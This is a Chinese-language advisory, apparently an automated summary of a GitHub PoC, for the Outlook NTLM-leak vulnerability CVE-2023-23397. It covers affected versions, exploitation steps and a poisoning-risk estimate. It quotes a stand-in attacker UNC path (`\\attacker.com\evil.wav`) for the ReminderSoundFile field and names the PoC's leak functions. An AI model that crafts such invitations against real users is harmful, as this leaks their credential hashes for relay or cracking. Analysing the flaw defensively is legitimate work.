## CVE-2023-23397-Microsoft Outlook Elevation of Privilege Vulnerability

**漏洞编号:** CVE-2023-23397

**漏洞类型:** 权限提升

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致NTLM Relay攻击并获取用户凭据

**影响版本:** 受影响版本包括Microsoft Outlook 2013 Service Pack 1, Outlook 2016, Office 2019, Office LTSC 2021, Microsoft 365 Apps for Enterprise，具体版本号参考漏洞库信息。

**利用条件:** 攻击者需要能够向受害者发送电子邮件，并且受害者使用存在漏洞的Outlook版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-23397 是一个 Microsoft Outlook 权限提升漏洞。攻击者可以通过发送特制的日历邀请或任务，其中包含指向攻击者控制的SMB服务器的UNC路径，来触发此漏洞。当Outlook处理此邀请或任务时，它将尝试连接到UNC路径，从而将受害者的NTLM哈希发送到攻击者的服务器。攻击者可以使用此哈希进行NTLM Relay攻击，或尝试破解哈希以获取用户的凭据。

**利用方式：**

1.  攻击者创建一个恶意的日历邀请或任务，在`ReminderSoundFile`字段中包含指向攻击者控制的SMB服务器的UNC路径（例如`\\attacker.com\evil.wav`）。
2.  攻击者将此日历邀请或任务发送给受害者。
3.  受害者使用易受攻击的Outlook版本打开日历邀请或任务。
4.  Outlook尝试播放提醒声音文件，因此会向攻击者的SMB服务器发送NTLM身份验证请求。
5.  攻击者捕获NTLM哈希并进行NTLM Relay攻击或尝试破解。

**有效性：**

提供的PowerShell PoC代码有效。它通过 `Send-CalendarNTLMLeak` 和 `Save-CalendarNTLMLeak` 函数创建包含恶意`ReminderSoundFile`属性的Outlook日历项目，从而触发漏洞。代码支持通过邮件发送日历或保存日历。

**投毒风险：**

PoC代码本身的功能是利用漏洞，但潜在的投毒风险在于：

*   **参数篡改：** 攻击者可能修改`remotefilepath`参数，使其指向其他恶意资源，例如包含恶意软件的SMB共享。
*   **代码执行：** 虽然PoC本身只是创建Outlook日历项目，但如果攻击者能够进一步利用NTLM Relay等方法，可能最终导致在目标系统上执行任意代码。

考虑到PoC的目的是演示漏洞，并且主要功能是利用Outlook的特性来触发NTLM认证，直接的投毒代码可能性较低。不过，由于PoC本身需要运行PowerShell，并且涉及到网络连接，存在一定的风险。如果用户不小心执行了被篡改过的PoC脚本，可能会带来安全风险。因此，评估投毒风险为10%。风险主要来自于使用者对PoC脚本的来源和内容缺乏验证，导致被恶意篡改的脚本利用。

**项目地址:** [cleverg0d/CVE-2023-23397-PoC-PowerShell](https://github.com/cleverg0d/CVE-2023-23397-PoC-PowerShell)

**漏洞详情:** [CVE-2023-23397](https://nvd.nist.gov/vuln/detail/CVE-2023-23397)